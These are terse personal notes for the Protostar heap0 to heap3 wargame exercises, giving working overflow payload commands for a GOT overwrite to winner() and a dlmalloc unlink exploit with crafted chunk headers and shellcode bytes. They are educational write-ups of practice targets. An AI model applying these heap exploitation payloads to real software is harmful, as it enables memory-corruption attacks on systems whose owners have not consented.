# Protostar heap-overflow notes

I've noticed that a lot of well documented writeups are present for protostar and decided to instaad post a cliff-notes version for this and upcoming ones. A bunch of useful [References](#ref)

### Heap \#0
Generated good ol' string using pattern_create for 140
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5A6

gbb shows segfault at 0x41346341 which is 72

attack payload: 

	./heap0 `python -c 'print "A" * 72 + "\x64\x84\x04\x08"'`

use ` not ' . **huge difference!!**

### Heap \#1
Did overflow with pattern_create
exact match at 20
Winner location at 0x08048494

Basically there is a printf funnction after strcpy but kept as puts
overwrite with GoT table address and then and point to winner()

put address is 08049774

	./heap1 `python -c "print 'A' * 20 + '\x74\x97\x04\x08' +' ' + '\x94\x84\x04\x08'"`

overwrite the address of argv[2] with GoT table's jump to puts(). Then second strcpy call will move address of winner() and overwrite the puts address
when printf is called we get winner

### Heap \#2

differene between auth and service is 0x10 or 16 bytes.
if u do serviceXXXXXXXXXXXXXXXXX [which x= 17 bytes] u get overflow and get int auth initialized to a specific value X. Then the check will pass.

Another way is use after free

### Heap \#3
FOLLOW DOUG MALLOC articles
In gdb:  

	r AAA `python -c 'print "B"*32 + "\xfc\xff\xff\xff" + "\xf0"'` CCCCDDDDEEEE
Now we can see that after B we overflow next chunk wiht fc which is basically previous chunk size of -4 and kept f0 which means chunk is in use.

Seg fault when trying to copy edx into eax  

	mov eax+12,edx  
	DDDD <<< EEEEE

0x804b128 - 0xc = 0x804b11c  for puts function address which has been adjusted to compensate for assembly

Final Payload:
    
    ./heap3 `python -c 'print "AAAA" + "\xeb\x06" + "\x90"*6 + "\x68\x64\x88\x04\x08\xc3"'` `python -c 'print "B"*16 + "\x01"*4 + "\xff"*4 + "B"*8 + "\xfc\xff\xff\xff" + "\xf0\xff\xff\xff"'` `python -c 'print "CCCC"+"\x1c\xb1\x04\x08"+"\x08\xc0\x04\x08"'`

## Ref
- http://www.win.tue.nl/~aeb/linux/hh/hh-11.html
- http://gee.cs.oswego.edu/dl/html/malloc.html
- http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html
- https://packetstormsecurity.com/files/view/40638/MallocMaleficarum.txt
- http://phrack.org/issues/66/10.html#article
- https://www.thc.org/root/docs/exploit_writing/Exploiting%20the%20wilderness.txt


